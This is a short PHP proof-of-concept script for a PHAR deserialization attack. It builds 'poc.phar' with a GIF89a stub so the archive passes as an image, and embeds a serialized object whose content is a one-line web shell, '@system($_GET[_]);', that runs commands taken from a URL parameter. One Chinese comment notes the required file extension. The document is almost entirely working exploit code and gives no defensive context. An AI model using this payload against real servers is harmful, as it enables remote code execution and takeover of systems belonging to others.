<?php
class Meme{
	var $filename= 'phar://poc.gif';
	var $content= '@system($_GET[_]);';
}

$o = new Meme();
$attackfile = 'poc.phar';// 后缀必须为phar，否则程序无法运行
file_exists($attackfile) ? unlink($attackfile) : null;
$phar=new Phar($attackfile);
$phar->startBuffering();
$phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($o);
$phar->addFromString("foo.txt","bar");
$phar->stopBuffering();
?>
